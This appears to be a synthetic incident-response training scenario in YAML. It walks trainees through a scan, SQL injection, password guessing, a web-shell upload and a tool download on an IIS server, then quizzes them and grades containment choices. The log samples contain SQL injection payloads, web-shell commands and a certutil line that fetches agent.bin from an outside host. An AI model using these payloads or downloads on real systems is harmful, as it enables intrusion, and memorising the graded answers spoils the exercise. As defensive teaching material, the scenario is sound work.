@@ -1,0 +1,632 @@
+slug: web-application-intrusion
+title: Web Application Intrusion
+summary: >
+  A public web application is scanned, probed for injection, attacked at its login form, and then
+  abused through a file-upload flaw to plant a web shell that runs commands as the web server.
+  Correlate the access log with what happened on the host.
+difficulty: intermediate
+duration_minutes: 25
+order: 3
+domain: web
+tags: [web, iis, sql-injection, brute-force, web-shell, defense]
+briefing: >
+  The web team reports that the customer portal on SRV-WEB01 was slow between 13:00 and 13:40 and
+  that a new file appeared in the uploads folder. You have the IIS access log and endpoint
+  telemetry from the server. Work out how the intruder got in and how far they went. All data in
+  this story is synthetic.
+
+attack_chain:
+  - tactic: Reconnaissance
+    technique: T1595.002
+    step: scan
+    description: An automated scanner enumerates the site and probes for exposed configuration files.
+  - tactic: Initial Access
+    technique: T1190
+    step: injection
+    description: Injection payloads are sent to a product-search parameter to test for SQL injection.
+  - tactic: Credential Access
+    technique: T1110.001
+    step: login-attack
+    description: Passwords are guessed against the administrator login form.
+  - tactic: Persistence
+    technique: T1505.003
+    step: upload-shell
+    description: A file-upload flaw is used to place a script in the web root that runs attacker commands.
+  - tactic: Execution
+    technique: T1059.003
+    step: commands
+    description: Commands are sent through the web shell and run as the web server's account.
+  - tactic: Command and Control
+    technique: T1105
+    step: tooling
+    description: A signed system utility downloads a tool onto the server.
+
+steps:
+  - id: scan
+    time: "13:02"
+    title: Scanner and exposed-file probes
+    narrative: >
+      The first requests of the afternoon come from a single address with a scanner's user agent and
+      a list of paths that should not exist.
+    telemetry:
+      - t: 0
+        repeat: 6
+        every: 3
+        category: web_request
+        host: SRV-WEB01
+        fields:
+          c-ip: 203.0.113.81
+          cs-method: GET
+          cs-uri-stem: "/{i}"
+          cs-user-agent: "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)"
+          sc-status: 404
+        note: A scanner announces itself in the user agent.
+      - t: 25
+        category: web_request
+        host: SRV-WEB01
+        fields:
+          {
+            c-ip: 203.0.113.81,
+            cs-method: GET,
+            cs-uri-stem: /.env,
+            cs-user-agent: "python-requests/2.32",
+            sc-status: 404,
+          }
+        note: A probe for an exposed environment file.
+      - t: 28
+        category: web_request
+        host: SRV-WEB01
+        fields:
+          {
+            c-ip: 203.0.113.81,
+            cs-method: GET,
+            cs-uri-stem: /.git/config,
+            cs-user-agent: "python-requests/2.32",
+            sc-status: 404,
+          }
+        note: A probe for an exposed repository config.
+    evidence:
+      - id: scan-log
+        title: Requests from 203.0.113.81
+        kind: log
+        significance: key
+        content: |
+          13:02:00 GET /0            404  Nikto/2.5.0
+          13:02:03 GET /1            404  Nikto/2.5.0
+          13:02:25 GET /.env         404  python-requests/2.32
+          13:02:28 GET /.git/config  404  python-requests/2.32
+        finding: "Every request was a 404: this address found nothing yet. It tells you what the intruder is looking for."
+      - id: traffic-baseline
+        title: Usual traffic mix
+        kind: note
+        significance: noise
+        content: About 400 requests per minute from 300 distinct addresses on a normal afternoon, none with a scanner user agent.
+    detections: [web-scanner-user-agent, web-sensitive-file-probe]
+    alert:
+      title: Known scanner user agent
+      severity: low
+      rule: web-scanner-user-agent
+    techniques: [T1595.002]
+    questions:
+      - id: q-scan
+        prompt: Every probe returned 404. Do you need to act?
+        options:
+          - id: a
+            text: Note it and watch this address, because scanning is the first step of an attack and it will change tactic.
+            correct: true
+            explanation: Failed scans are noise on their own, but they tell you who is interested. Watch the address and check it against later, more serious activity.
+          - id: b
+            text: No. 404 means the site is safe.
+            explanation: 404s mean these particular paths do not exist, not that the site is safe.
+          - id: c
+            text: Yes. Take the site offline immediately.
+            explanation: Disproportionate for a failed scan, and it would hand the intruder a denial of service for free.
+    graph_nodes:
+      - { id: ip-intruder, type: ip, label: "203.0.113.81" }
+      - { id: host-web, type: host, label: SRV-WEB01 }
+      - { id: det-scanner, type: detection, label: Scanner user agent, ref: web-scanner-user-agent }
+      - { id: alert-scanner, type: alert, label: Known scanner user agent }
+      - { id: tech-scan, type: technique, label: Vulnerability Scanning, ref: T1595.002 }
+    graph_edges:
+      - { source: ip-intruder, target: host-web, relation: connected to }
+      - { source: det-scanner, target: alert-scanner, relation: triggered }
+      - { source: det-scanner, target: tech-scan, relation: mapped to }
+      - { source: alert-scanner, target: ip-intruder, relation: associated with }
+
+  - id: injection
+    time: "13:10"
+    title: SQL injection probing
+    narrative: >
+      The same address now sends payloads to the product search. One of them produces a server error,
+      which is the signal an attacker is looking for.
+    telemetry:
+      - t: 10
+        category: web_request
+        host: SRV-WEB01
+        fields:
+          {
+            c-ip: 203.0.113.81,
+            cs-method: GET,
+            cs-uri-stem: /products,
+            cs-uri-query: "id=1'%20OR%20'1'='1",
+            cs-user-agent: "Mozilla/5.0 (Windows NT 10.0)",
+            sc-status: 200,
+          }
+        note: A tautology payload that returns the whole table.
+      - t: 24
+        category: web_request
+        host: SRV-WEB01
+        fields:
+          {
+            c-ip: 203.0.113.81,
+            cs-method: GET,
+            cs-uri-stem: /products,
+            cs-uri-query: "id=1 UNION SELECT username,password FROM users",
+            cs-user-agent: "Mozilla/5.0 (Windows NT 10.0)",
+            sc-status: 500,
+          }
+        note: "A UNION SELECT that returns 500: the input reached the database."
+    evidence:
+      - id: injection-log
+        title: Search requests with payloads
+        kind: log
+        significance: key
+        content: |
+          13:10:10 GET /products?id=1' OR '1'='1                                   200  8,412 bytes
+          13:10:24 GET /products?id=1 UNION SELECT username,password FROM users   500  1,020 bytes
+        finding: A 500 to a UNION SELECT means the database processed the injected text. The first request returned far more data than a normal search.
+      - id: waf
+        title: Web application firewall
+        kind: alert
+        significance: supporting
+        content: The WAF is in detection-only mode for /products and did not block either request.
+        finding: The safety net was not on. Note it for the post-incident review.
+    detections: [web-sql-injection-probe]
+    alert:
+      title: SQL injection probe
+      severity: high
+      rule: web-sql-injection-probe
+    techniques: [T1190]
+    questions:
+      - id: q-sqli
+        prompt: What most strongly suggests the injection reached the database?
+        options:
+          - id: a
+            text: The tautology returned about 8 KB where a normal search returns a few hundred bytes, and the UNION query caused a 500.
+            correct: true
+            explanation: A response that is far larger than normal and a server error caused by SQL syntax both show the input is inside a query.
+          - id: b
+            text: The user agent looks like a browser.
+            explanation: User agents are trivially faked and say nothing about the query.
+          - id: c
+            text: The request came from a public address.
+            explanation: Almost all legitimate visitors do too.
+    graph_nodes:
+      - { id: det-sqli, type: detection, label: SQL injection probe, ref: web-sql-injection-probe }
+      - { id: alert-sqli, type: alert, label: SQL injection probe }
+      - { id: tech-exploit, type: technique, label: Exploit Public-Facing Application, ref: T1190 }
+    graph_edges:
+      - { source: ip-intruder, target: host-web, relation: connected to }
+      - { source: det-sqli, target: alert-sqli, relation: triggered }
+      - { source: det-sqli, target: tech-exploit, relation: mapped to }
+      - { source: alert-sqli, target: host-web, relation: associated with }
+
+  - id: login-attack
+    time: "13:18"
+    title: Guessing the administrator password
+    narrative: >
+      A different address attacks the administrator login form with a burst of failed attempts,
+      followed by a redirect that means one worked.
+    telemetry:
+      - t: 0
+        repeat: 14
+        every: 3
+        category: web_request
+        host: SRV-WEB01
+        fields:
+          {
+            c-ip: 203.0.113.82,
+            cs-method: POST,
+            cs-uri-stem: /admin/login,
+            cs-user-agent: "Mozilla/5.0 (Windows NT 10.0)",
+            sc-status: 401,
+          }
+        note: Failed logins, about one every three seconds.
+      - t: 46
+        category: web_request
+        host: SRV-WEB01
+        fields:
+          {
+            c-ip: 203.0.113.82,
+            cs-method: POST,
+            cs-uri-stem: /admin/login,
+            cs-user-agent: "Mozilla/5.0 (Windows NT 10.0)",
+            sc-status: 302,
+          }
+        note: "A 302 redirect to the dashboard: this attempt worked."
+    evidence:
+      - id: login-burst
+        title: POSTs to /admin/login from 203.0.113.82
+        kind: log
+        significance: key
+        content: |
+          13:18:00 .. 13:18:39   14 x POST /admin/login  401
+          13:18:46               1 x POST /admin/login   302
+        finding: Fourteen failures then a success from one address within a minute is password guessing that worked.
+      - id: account-lockout
+        title: Lockout policy
+        kind: note
+        significance: supporting
+        content: The portal has no lockout or rate limit on /admin/login.
+        finding: Nothing slowed the guessing down.
+    detections: [web-login-brute-force-burst]
+    alert:
+      title: Burst of failed web logins
+      severity: high
+      rule: web-login-brute-force-burst
+    techniques: [T1110.001]
+    questions:
+      - id: q-brute
+        prompt: The scanner was 203.0.113.81, the login attack 203.0.113.82. How do you treat them?
+        options:
+          - id: a
+            text: "As likely the same operator: adjacent addresses, same hour, escalating steps. Track them together but confirm before merging."
+            correct: true
+            explanation: Neighbouring addresses in the same window with an escalating sequence are a strong lead. Confirm with a shared trait (user agent, timing) before you assert it.
+          - id: b
+            text: As unrelated. Different addresses can never be the same actor.
+            explanation: Attackers rotate addresses constantly. Independent treatment misses the campaign.
+          - id: c
+            text: As the same address, because you only track /24 ranges.
+            explanation: Do not assert what the data does not show. They are different addresses.
+    graph_nodes:
+      - { id: ip-intruder2, type: ip, label: "203.0.113.82" }
+      - { id: user-admin, type: user, label: portal administrator }
+      - {
+          id: det-brute,
+          type: detection,
+          label: Failed login burst,
+          ref: web-login-brute-force-burst,
+        }
+      - { id: alert-brute, type: alert, label: Burst of failed web logins }
+      - { id: tech-brute, type: technique, label: Password Guessing, ref: T1110.001 }
+    graph_edges:
+      - { source: ip-intruder2, target: host-web, relation: connected to }
+      - { source: ip-intruder2, target: ip-intruder, relation: associated with }
+      - { source: ip-intruder2, target: user-admin, relation: associated with }
+      - { source: det-brute, target: alert-brute, relation: triggered }
+      - { source: det-brute, target: tech-brute, relation: mapped to }
+      - { source: alert-brute, target: user-admin, relation: associated with }
+
+  - id: upload-shell
+    time: "13:26"
+    title: An upload becomes a web shell
+    narrative: >
+      From the administrator dashboard the intruder uses the avatar upload. Endpoint telemetry shows
+      the web server process writing a script file into the uploads folder.
+    telemetry:
+      - t: 5
+        category: web_request
+        host: SRV-WEB01
+        fields:
+          {
+            c-ip: 203.0.113.82,
+            cs-method: POST,
+            cs-uri-stem: /upload/avatar.aspx,
+            cs-user-agent: "Mozilla/5.0 (Windows NT 10.0)",
+            sc-status: 200,
+          }
+        note: A multipart upload that the application accepts.
+      - t: 8
+        category: file_event
+        host: SRV-WEB01
+        fields:
+          Image: 'C:\Windows\System32\inetsrv\w3wp.exe'
+          TargetFilename: 'C:\inetpub\wwwroot\uploads\help.aspx'
+        note: The web server worker process writes a script into a public folder.
+    evidence:
+      - id: file-write
+        title: File creation in the web root
+        kind: log
+        significance: key
+        content: |
+          13:26:08  FileCreate  C:\inetpub\wwwroot\uploads\help.aspx
+                    Image      C:\Windows\System32\inetsrv\w3wp.exe
+        finding: A script file (.aspx) written by the web server process into a folder it serves is the signature of a web shell.
+      - id: upload-check
+        title: Upload handler review
+        kind: note
+        significance: supporting
+        content: The handler checks that the file name is not empty, but not the extension or the content type.
+        finding: "The root cause: the application lets an authenticated user upload executable content."
+    detections: [win-webshell-file-written-in-webroot]
+    alert:
+      title: Script written to the web root by the web server
+      severity: critical
+      rule: win-webshell-file-written-in-webroot
+    techniques: [T1505.003]
+    decision:
+      id: d-web
+      prompt: A web shell exists on a production server. What is your first action?
+      context: The portal takes about 30% of daily orders. The shell can be used at any moment.
+      options:
+        - id: block-remove
+          text: Block the uploads path at the web server or WAF, and preserve then quarantine help.aspx. Keep the site up.
+          quality: best
+          feedback: This closes the door and keeps the evidence and the business running. Then investigate what the shell was used for.
+        - id: offline
+          text: Take the entire site offline until the investigation is done.
+          quality: acceptable
+          feedback: Safe, but it costs orders and is more than you need. Block the shell path first, and escalate to offline only if you cannot contain it.
+        - id: delete
+          text: Delete help.aspx and carry on.
+          quality: poor
+          feedback: Deleting loses the file you need to understand the intruder's tooling, and it does not fix the upload flaw, so a new one is created within minutes.
+    graph_nodes:
+      - { id: proc-w3wp, type: process, label: w3wp.exe }
+      - { id: file-shell, type: process, label: uploads/help.aspx }
+      - {
+          id: det-shell,
+          type: detection,
+          label: Web shell file written,
+          ref: win-webshell-file-written-in-webroot,
+        }
+      - { id: alert-shell, type: alert, label: Script written to the web root }
+      - { id: tech-shell, type: technique, label: Web Shell, ref: T1505.003 }
+    graph_edges:
+      - { source: ip-intruder2, target: proc-w3wp, relation: connected to }
+      - { source: proc-w3wp, target: file-shell, relation: executed }
+      - { source: det-shell, target: alert-shell, relation: triggered }
+      - { source: det-shell, target: tech-shell, relation: mapped to }
+      - { source: alert-shell, target: file-shell, relation: associated with }
+
+  - id: commands
+    time: "13:29"
+    title: Commands through the shell
+    narrative: >
+      The shell is used. Each request with a command parameter is followed, a moment later, by a
+      child process of the web server.
+    telemetry:
+      - t: 4
+        category: web_request
+        host: SRV-WEB01
+        fields:
+          {
+            c-ip: 203.0.113.82,
+            cs-method: GET,
+            cs-uri-stem: /uploads/help.aspx,
+            cs-uri-query: "cmd=whoami",
+            cs-user-agent: "Mozilla/5.0",
+            sc-status: 200,
+          }
+        note: A command sent in the query string.
+      - t: 5
+        category: process_creation
+        host: SRV-WEB01
+        user: 'IIS APPPOOL\DefaultAppPool'
+        fields:
+          Image: 'C:\Windows\System32\cmd.exe'
+          ParentImage: 'C:\Windows\System32\inetsrv\w3wp.exe'
+          CommandLine: "cmd.exe /c whoami"
+          IntegrityLevel: High
+        note: The web server worker starts a command shell.
+      - t: 34
+        category: web_request
+        host: SRV-WEB01
+        fields:
+          {
+            c-ip: 203.0.113.82,
+            cs-method: GET,
+            cs-uri-stem: /uploads/help.aspx,
+            cs-uri-query: "cmd=net+user",
+            cs-user-agent: "Mozilla/5.0",
+            sc-status: 200,
+          }
+      - t: 35
+        category: process_creation
+        host: SRV-WEB01
+        user: 'IIS APPPOOL\DefaultAppPool'
+        fields:
+          Image: 'C:\Windows\System32\net.exe'
+          ParentImage: 'C:\Windows\System32\inetsrv\w3wp.exe'
+          CommandLine: "net user"
+          IntegrityLevel: High
+        note: Local account enumeration.
+    evidence:
+      - id: req-proc
+        title: Requests matched to processes
+        kind: log
+        significance: key
+        content: |
+          13:29:04  GET /uploads/help.aspx?cmd=whoami     -> 13:29:05  w3wp.exe -> cmd.exe /c whoami
+          13:29:34  GET /uploads/help.aspx?cmd=net+user   -> 13:29:35  w3wp.exe -> net user
+        finding: The one-second gap between request and process proves that the request caused the command.
+      - id: privileges
+        title: Web server identity
+        kind: note
+        significance: supporting
+        content: The application pool runs with local administrator rights on SRV-WEB01.
+        finding: Whatever the shell runs, it runs with high integrity. The scope of the incident is the whole server.
+    detections: [web-webshell-command-parameter-request, win-webserver-spawns-shell]
+    alert:
+      title: Web server spawned a command shell
+      severity: critical
+      rule: win-webserver-spawns-shell
+    techniques: [T1059.003]
+    questions:
+      - id: q-corr
+        prompt: Why is the combination of web-request and process telemetry so much stronger than either alone?
+        options:
+          - id: a
+            text: The request shows the intent and the process shows the effect; together they prove cause and timing.
+            correct: true
+            explanation: A command parameter alone could be a curious visitor. A child process alone could be a maintenance task. Both, one second apart, is a web shell.
+          - id: b
+            text: Two logs are always more reliable than one.
+            explanation: Only if they answer different questions. Here they do.
+          - id: c
+            text: The web log is unreliable and the process log confirms it.
+            explanation: Both are reliable here. Their strength is in being complementary.
+    graph_nodes:
+      - { id: proc-cmd, type: process, label: cmd.exe /c whoami }
+      - { id: proc-net, type: process, label: net user }
+      - {
+          id: det-spawn,
+          type: detection,
+          label: Web server spawns shell,
+          ref: win-webserver-spawns-shell,
+        }
+      - { id: alert-spawn, type: alert, label: Web server spawned a shell }
+      - { id: tech-cmd, type: technique, label: Windows Command Shell, ref: T1059.003 }
+    graph_edges:
+      - { source: file-shell, target: proc-cmd, relation: executed }
+      - { source: file-shell, target: proc-net, relation: executed }
+      - { source: det-spawn, target: alert-spawn, relation: triggered }
+      - { source: det-spawn, target: tech-cmd, relation: mapped to }
+      - { source: alert-spawn, target: proc-cmd, relation: associated with }
+
+  - id: tooling
+    time: "13:34"
+    title: A tool is downloaded
+    narrative: >
+      The shell is used once more, this time to fetch something from outside.
+    telemetry:
+      - t: 8
+        category: process_creation
+        host: SRV-WEB01
+        user: 'IIS APPPOOL\DefaultAppPool'
+        fields:
+          Image: 'C:\Windows\System32\certutil.exe'
+          ParentImage: 'C:\Windows\System32\inetsrv\w3wp.exe'
+          CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.24/agent.bin C:\Windows\Temp\agent.bin'
+          IntegrityLevel: High
+        note: A signed Windows binary used as a downloader, started by the web server.
+    evidence:
+      - id: download
+        title: certutil command line
+        kind: log
+        significance: key
+        content: |
+          certutil.exe -urlcache -split -f http://198.51.100.24/agent.bin C:\Windows\Temp\agent.bin
+          parent: w3wp.exe   user: IIS APPPOOL\DefaultAppPool
+        finding: The intruder is bringing in a tool. The file name and the address are new indicators to hunt for.
+      - id: egress
+        title: Egress policy
+        kind: network
+        significance: supporting
+        content: The web tier may reach the internet on ports 80 and 443 for update checks.
+        finding: Nothing prevented the download. Tightening egress from the web tier would have blocked it.
+    detections: [win-certutil-urlcache-download, win-webserver-spawns-shell]
+    alert:
+      title: certutil used to download a file
+      severity: high
+      rule: win-certutil-urlcache-download
+    techniques: [T1105]
+    questions:
+      - id: q-tool
+        prompt: What do you do with the downloaded file agent.bin?
+        options:
+          - id: a
+            text: Copy it to a safe analysis location, hash it and search for the hash and address elsewhere. Do not run it.
+            correct: true
+            explanation: Preserve, hash, and hunt. Executing an unknown file, even to satisfy curiosity, risks your own environment.
+          - id: b
+            text: Run it in a test window to see what it does.
+            explanation: Only in an isolated sandbox built for that purpose. Not on a production server or a laptop.
+          - id: c
+            text: Delete it immediately.
+            explanation: You lose the artefact that tells you what the intruder intended.
+    graph_nodes:
+      - { id: proc-certutil, type: process, label: certutil.exe -urlcache }
+      - { id: ip-tool, type: ip, label: "198.51.100.24" }
+      - {
+          id: det-certutil,
+          type: detection,
+          label: certutil download,
+          ref: win-certutil-urlcache-download,
+        }
+      - { id: alert-certutil, type: alert, label: certutil used to download a file }
+      - { id: tech-ingress, type: technique, label: Ingress Tool Transfer, ref: T1105 }
+    graph_edges:
+      - { source: proc-w3wp, target: proc-certutil, relation: executed }
+      - { source: proc-certutil, target: ip-tool, relation: connected to }
+      - { source: det-certutil, target: alert-certutil, relation: triggered }
+      - { source: det-certutil, target: tech-ingress, relation: mapped to }
+      - { source: alert-certutil, target: proc-certutil, relation: associated with }
+
+containment:
+  - id: block-uploads
+    action: Block requests to /uploads/*.aspx at the WAF or web server, and disable script execution in that folder
+    category: block
+    quality: recommended
+    effect: Makes the shell unreachable and stops new shells from running from the same folder.
+    feedback: Correct and fast. It keeps the site up.
+  - id: preserve-shell
+    action: Copy help.aspx and agent.bin to an evidence store, hash them, then quarantine the originals
+    category: eradicate
+    quality: recommended
+    effect: Keeps the artefacts for analysis and indicator sharing.
+    feedback: Correct. Preserve first, then remove.
+  - id: block-ips
+    action: Block 203.0.113.81, 203.0.113.82 and 198.51.100.24 and search history for them
+    category: block
+    quality: recommended
+    effect: Cuts the known infrastructure and reveals earlier activity.
+    feedback: Reasonable and cheap. Do not rely on it alone; addresses change.
+  - id: reset-admin
+    action: Reset the portal administrator password and sessions, and require MFA for /admin
+    category: credentials
+    quality: recommended
+    effect: Removes the guessed credential and closes the path used to reach the upload.
+    feedback: Correct. The guessed password is the reason the intruder reached the upload.
+  - id: fix-upload
+    action: Restrict uploads to image types and store them outside the web root
+    category: other
+    quality: recommended
+    effect: Fixes the root cause, so the same technique fails next time.
+    feedback: The real fix. Without it the shell returns.
+  - id: reboot
+    action: Reboot the server to clear the intruder's processes
+    category: eradicate
+    quality: harmful
+    effect: Loses volatile evidence and does not remove the shell file, so access returns after the restart.
+    feedback: A reboot removes running state but not the file on disk. Preserve first.
+  - id: ignore-medium
+    action: Downgrade all four earlier alerts to informational and continue
+    category: other
+    quality: harmful
+    effect: Buries the early warning signs that would have led to earlier containment next time.
+    feedback: Learn from the chain instead. The lowest-severity alerts were the earliest ones.
+  - id: rotate-db
+    action: Rotate the database credentials used by the application
+    category: credentials
+    quality: optional
+    effect: Reduces the impact if the SQL injection exposed them.
+    feedback: A sensible precaution given the injection step.
+
+postmortem:
+  summary: >
+    A scanner and an injection probe found a public application; a weak administrator password fell
+    to guessing; an upload handler that accepted scripts let the intruder place a web shell; and the
+    shell ran commands as an administrator-level account. Each stage produced an alert. The four
+    detections on the host and in the access log agreed with each other.
+  root_cause: >
+    The upload handler accepted executable content, the administrator login had no lockout or MFA,
+    and the web application pool ran with local administrator rights.
+  what_worked:
+    - Access-log rules caught the scan, the injection and the password guessing.
+    - Endpoint telemetry tied web requests to child processes of the web server.
+  what_to_improve:
+    - Validate upload types and content, store uploads outside the web root, and disable script execution there.
+    - Add rate limiting, lockout and MFA to administrator logins.
+    - Run the application pool with least privilege.
+    - Turn the WAF from detection-only to blocking for the injection rules.
+    - Restrict outbound access from the web tier.
+  detections_to_add:
+    - Any new script file in an uploads directory, regardless of the writing process.
+    - A successful login shortly after a burst of failures from the same address.
+  lessons:
+    - Low-severity early alerts (scanner, 404s) are the cheapest place to start watching an address.
+    - A web shell is proven by a request followed by a child process of the web server.
+    - The fix for a web shell is the upload flaw, not the file.
+    - "Preserve before you delete: the artefacts tell you how far the intruder got."
